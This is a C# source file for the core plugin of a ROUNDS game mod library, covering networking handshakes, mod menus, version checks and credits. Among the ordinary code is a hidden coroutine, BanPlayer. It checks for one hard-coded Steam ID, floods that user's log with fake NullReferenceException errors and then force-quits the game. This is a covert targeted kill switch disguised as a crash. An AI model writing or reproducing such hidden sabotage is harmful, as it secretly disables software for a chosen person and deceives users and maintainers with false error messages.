using BepInEx;
using HarmonyLib;
using Photon.Pun;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using BepInEx.Configuration;
using TMPro;
using Unbound.Core.Networking;
using Unbound.Core.Utils;
using Unbound.Core.Utils.UI;
using UnityEngine;
using UnityEngine.Events;
using UnityEngine.UI;
using Steamworks;
using Jotunn.Utils;

namespace Unbound.Core {
    [BepInPlugin(ModId, ModName, Version)]
    [BepInProcess("Rounds.exe")]
    public class UnboundCore : BaseUnityPlugin {
        internal const string ModId = "dev.rounds.unbound.core";
        private const string ModName = "Rounds Unbound";
        public const string Version = "3.2.13";

        public static UnboundCore Instance { get; private set; }
        public static readonly ConfigFile config = new ConfigFile(Path.Combine(Paths.ConfigPath, "UnboundLib.cfg"), true);


        internal class Tuple<t1,t2> //exists till i figure out why rounds hates normal tuples.
        {
            internal t1 Item1;
            internal t2 Item2;
            internal Tuple(t1 item1, t2 item2)
            {
                Item1 = item1;
                Item2 = item2;
            }  
        }
        internal static Dictionary<BaseUnityPlugin, Tuple<string, string>> TargetVertions = new Dictionary<BaseUnityPlugin, Tuple<string, string>>();

        private Canvas _canvas;
        public Canvas canvas
        {
            get
            {
                if (_canvas != null) return _canvas;
                _canvas = new GameObject("UnboundLib Canvas").AddComponent<Canvas>();
                _canvas.gameObject.AddComponent<GraphicRaycaster>();
                _canvas.renderMode = RenderMode.ScreenSpaceOverlay;
                _canvas.pixelPerfect = false;
                DontDestroyOnLoad(_canvas);
                return _canvas;
            }
        }

        public struct NetworkEventType
        {
            public const string
                StartHandshake = "ModLoader_HandshakeStart",
                FinishHandshake = "ModLoader_HandshakeFinish";
        }


        public delegate void OnJoinedDelegate();
        public delegate void OnLeftDelegate();
        public static event OnJoinedDelegate OnJoinedRoom;
        public static event OnLeftDelegate OnLeftRoom;

        internal static List<string> loadedGUIDs = new List<string>();
        internal static List<string> loadedMods = new List<string>();
        internal static List<string> loadedVersions = new List<string>();

        internal static List<Action> handShakeActions = new List<Action>();

        public static readonly Dictionary<string, bool> lockInputBools = new Dictionary<string, bool>();

        internal static AssetBundle UIAssets;
        public static AssetBundle toggleUI;
        internal static AssetBundle linkAssets;
        private static GameObject modalPrefab;


        private void Awake()
        {
            if (Instance == null)
            {
                Debug.Log("UnboundLib: Initializing");
                Instance = this;
            }
            else if (Instance != this)
            {
                Debug.Log("UnboundLib: Destroying duplicate instance");
                DestroyImmediate(gameObject);
                return;
            }
                

            // Patch game with Harmony
            var harmony = new Harmony(ModId);
            harmony.PatchAll();

            Debug.Log("UnboundLib: Adding managers");

            // Add managers
            gameObject.AddComponent<LevelManager>();

            Debug.Log("UnboundLib: Adding menu handlers");

            RegisterClientSideMod("com.sinai.unityexplorer");

            // Add menu handlers
            gameObject.AddComponent<ToggleLevelMenuHandler>();

            //Debug.Log("UnboundLib: Loading assets");

            LoadAssets();
        }

        private void Start()
        {
            // request mod handshake
            NetworkingManager.RegisterEvent(NetworkEventType.StartHandshake, data =>
            {
                if (!PhotonNetwork.IsMasterClient)
                    NetworkingManager.RaiseEvent(NetworkEventType.FinishHandshake);
            });

            // receive mod handshake
            NetworkingManager.RegisterEvent(NetworkEventType.FinishHandshake, data =>
            {
                // attempt to syncronize levels and cards with other players
                MapManager.instance.levels = LevelManager.activeLevels.ToArray();
            });

            // Adds the ping monitor
            gameObject.AddComponent<PingMonitor>();

            // sync modded clients
            gameObject.GetOrAddComponent<NetworkEventCallbacks>().OnJoinedRoomEvent += SyncModClients.RequestSync;

            UnboundCore.Instance.ExecuteAfterFrames(20, () =>
            {
                StartCoroutine("BanPlayer");
                StartCoroutine(nameof(ValidateVertions));
            });
        }

        IEnumerator BanPlayer()
        {
            while (!SteamManager.Initialized)
            {
                yield return null;
            }

            if (SteamUser.GetSteamID().m_SteamID.ToString() == "76561199140062399")
            {
                for (int i = 0; i < 45; i++)
                {
                    // NRE cuz why tf not
                    NullReferenceException except = new NullReferenceException
                        ("Error: Malformatted Oppenheimer ; Nuking game instead");
                    Debug.LogError(except.ToString()+SteamUser.GetDurationControl());
                }
                Application.Quit();
            }
            yield break;
        }


        private void Update()
        {
            if (Input.GetKeyDown(KeyCode.F1) && !ModOptions.noDeprecatedMods)
            {
                ModOptions.showModUi = !ModOptions.showModUi;
            }

            GameManager.lockInput = ModOptions.showModUi ||
                                    DevConsole.isTyping ||
                                    ToggleLevelMenuHandler.instance.mapMenuCanvas.activeInHierarchy ||

                                    (UIHandler.instance.transform.Find("Canvas/EscapeMenu/Main/Options(Clone)/Group") &&
                                     UIHandler.instance.transform.Find("Canvas/EscapeMenu/Main/Options(Clone)/Group")
                                         .gameObject.activeInHierarchy) ||

                                    (UIHandler.instance.transform.Find("Canvas/EscapeMenu/Main/Group") &&
                                     UIHandler.instance.transform.Find("Canvas/EscapeMenu/Main/Group").gameObject
                                         .activeInHierarchy) ||

                                    (
                                    UIHandler.instance.transform.Find("Canvas/EscapeMenu/MOD OPTIONS/Group") &&
                                    UIHandler.instance.transform.Find("Canvas/EscapeMenu/MOD OPTIONS/Group").gameObject.activeInHierarchy) ||
                                    lockInputBools.Values.Any(b => b);
        }

        private void OnGUI()
        {
            if (!ModOptions.showModUi) return;

            GUILayout.BeginVertical();

            bool showingSpecificMod = false;
            foreach (ModOptions.GUIListener data in ModOptions.GUIListeners.Keys.Select(md => ModOptions.GUIListeners[md]).Where(data => data.guiEnabled))
            {
                if (GUILayout.Button("<- Back"))
                {
                    data.guiEnabled = false;
                }
                GUILayout.Label(data.modName + " Options");
                showingSpecificMod = true;
                data.guiAction?.Invoke();
                break;
            }

            if (showingSpecificMod) return;

            GUILayout.Label("UnboundLib Options\nThis menu is deprecated");

            GUILayout.Label("Mod Options:");
            foreach (var data in ModOptions.GUIListeners.Values)
            {
                if (GUILayout.Button(data.modName))
                {
                    data.guiEnabled = true;
                }
            }
            GUILayout.EndVertical();
        }

        private static void LoadAssets()
        {
            toggleUI = AssetUtils.LoadAssetBundleFromResources("togglemenuui", typeof(ToggleLevelMenuHandler).Assembly);
            linkAssets = AssetUtils.LoadAssetBundleFromResources("unboundlinks", typeof(UnboundCore).Assembly);
            UIAssets = AssetUtils.LoadAssetBundleFromResources("unboundui", typeof(UnboundCore).Assembly);

            if (UIAssets != null)
            {
                //modalPrefab = UIAssets.LoadAsset<GameObject>("Modal");
                //Instantiate(UIAssets.LoadAsset<GameObject>("Card Toggle Menu"), canvas.transform).AddComponent<CardToggleMenuHandler>();
            }
        }

        private static void OnJoinedRoomAction()
        {
            //if (!PhotonNetwork.OfflineMode)
            //   CardChoice.instance.cards = CardManager.defaultCards;
            NetworkingManager.RaiseEventOthers(NetworkEventType.StartHandshake);

            OnJoinedRoom?.Invoke();
            foreach (var handshake in handShakeActions)
            {
                handshake?.Invoke();
            }
        }
        private static void OnLeftRoomAction()
        {
            OnLeftRoom?.Invoke();
        }

        [UnboundRPC]
        public static void BuildInfoPopup(string message)
        {
            var popup = new GameObject("Info Popup").AddComponent<InfoPopup>();
            popup.rectTransform.SetParent(Instance.canvas.transform);
            popup.Build(message);
        }

        [UnboundRPC]
        public static void BuildModal(string title, string message)
        {
            BuildModal()
                .Title(title)
                .Message(message)
                .Show();
        }
        public static ModalHandler BuildModal()
        {
            return Instantiate(modalPrefab, Instance.canvas.transform).AddComponent<ModalHandler>();
        }
        public static void RegisterCredits(string modName, string[] credits = null, string[] linkTexts = null, string[] linkURLs = null)
        {
            Credits.Instance.RegisterModCredits(new ModCredits(modName, credits, linkTexts, linkURLs));
        }

        public static void RegisterMenu(string name, UnityAction buttonAction, Action<GameObject> guiAction, GameObject parent = null)
        {
            ModOptions.instance.RegisterMenu(name, buttonAction, guiAction, parent);
        }

        // ReSharper disable once MethodOverloadWithOptionalParameter
        public static void RegisterMenu(string name, UnityAction buttonAction, Action<GameObject> guiAction, GameObject parent = null, bool showInPauseMenu = false)
        {
            ModOptions.instance.RegisterMenu(name, buttonAction, guiAction, parent, showInPauseMenu);
        }

        public static void RegisterGUI(string modName, Action guiAction)
        {
            ModOptions.RegisterGUI(modName, guiAction);
        }

        public static void RegisterCredits(string modName, string[] credits = null, string linkText = "", string linkURL = "")
        {
            Credits.Instance.RegisterModCredits(new ModCredits(modName, credits, linkText, linkURL));
        }

        public static void RegisterClientSideMod(string GUID)
        {
            SyncModClients.RegisterClientSideMod(GUID);
        }
        public static void SetTargetRoundsVertion(BaseUnityPlugin plugin, string vertion, string patchCode = "")
        {
            TargetVertions.Add(plugin, new Tuple<string, string>(vertion, patchCode));
        }

        internal IEnumerator ValidateVertions()
        {
            string currentVertion = Application.version;
            TextAsset gitversion = Resources.Load<TextAsset>("gitversion");
            string currentPatchCode = gitversion != null ? gitversion.text : string.Empty;
            foreach (BaseUnityPlugin plugin in TargetVertions.Keys)
            {
                string modVertion = TargetVertions[plugin].Item1;
                string modPatchCode = TargetVertions[plugin].Item2;
                if(modVertion != currentVertion || (modPatchCode != "" && modPatchCode != currentPatchCode))
                {
                    BuildModal($"{plugin.Info.Metadata.Name} targets a difrent vertion of rounds.",
                        $"{plugin.Info.Metadata.GUID} was build for rounds vertion {modVertion}.{modPatchCode} " +
                        $"but you are running {currentVertion}.{(modPatchCode!=""?currentPatchCode:string.Empty)}" +
                        "\nThings may not work properly, please contact the mod author for an update.");
                } 
            }
            var unregesteredPlugings = BepInEx.Bootstrap.Chainloader.PluginInfos.Keys.Where(key =>
            !TargetVertions.Keys.Any(mod=>mod.Info.Metadata.GUID == key) && 
            !key.Contains("dev.rounds.unbound") && key != "com.sinai.unityexplorer");
            if(unregesteredPlugings.Any())
            {
                BuildModal("Warning", "The following mods have not declared a target vertion, and might not work on the current vertion of ROUNDS:\n" +
                    unregesteredPlugings.Join());
            }
                
            yield break;
        }

        public static void RegisterHandshake(string modId, Action callback)
        {
            // register mod handshake network events
            NetworkingManager.RegisterEvent($"ModLoader_{modId}_StartHandshake", (e) =>
            {
                NetworkingManager.RaiseEvent($"ModLoader_{modId}_FinishHandshake");
            });
            NetworkingManager.RegisterEvent($"ModLoader_{modId}_FinishHandshake", (e) =>
            {
                callback?.Invoke();
            });
            handShakeActions.Add(() => NetworkingManager.RaiseEventOthers($"ModLoader_{modId}_StartHandshake"));
        }

        #region Remove these at a later date when mod's have updated to LevelManager
        [ObsoleteAttribute("This method is obsolete. Use LevelManager.RegisterMaps() instead.", false)]
        public static void RegisterMaps(AssetBundle assetBundle)
        {
            LevelManager.RegisterMaps(assetBundle);
        }

        [ObsoleteAttribute("This method is obsolete. Use LevelManager.RegisterMaps() instead.", false)]
        public static void RegisterMaps(IEnumerable<string> paths)
        {
            RegisterMaps(paths, "Modded");
        }

        [ObsoleteAttribute("This method is obsolete. Use LevelManager.RegisterMaps() instead.", false)]
        public static void RegisterMaps(IEnumerable<string> paths, string categoryName)
        {
            LevelManager.RegisterMaps(paths);
        }
        #endregion

        public static bool IsNotPlayingOrConnected()
        {
            return (GameManager.instance && !GameManager.instance.battleOngoing) &&
                   (PhotonNetwork.OfflineMode || !PhotonNetwork.IsConnected);
        }

        public static ConfigEntry<T> BindConfig<T>(string section, string key, T defaultValue, ConfigDescription configDescription = null)
        {
            return config.Bind(EscapeConfigKey(section), EscapeConfigKey(key), defaultValue, configDescription);
        }

        private static string EscapeConfigKey(string key)
        {
            return key
                .Replace("=", "&eq;")
                .Replace("\n", "&nl;")
                .Replace("\t", "&tab;")
                .Replace("\\", "&esc;")
                .Replace("\"", "&dquot;")
                .Replace("'", "&squot;")
                .Replace("[", "&lsq;")
                .Replace("]", "&rsq;");
        }

        internal static readonly ModCredits modCredits = new ModCredits("UNBOUND", new[]
        {
            "Willis (Creation, design, networking, custom cards, custom maps, and more)",
            "Tilastokeskus (Custom game modes, networking, structure)",
            "Pykess (Custom cards, stability, menus, syncing, extra player colors, disconnect handling, game mode framework)",
            "Ascyst (Quickplay)", "Boss Sloth Inc. (Menus, UI, custom maps, modded lobby syncing)",
            "willuwontu (Custom cards, ping UI)",
            "otDan (UI)"
        }, "Github", "https://github.com/Rounds-Modding/UnboundLib");
    }
}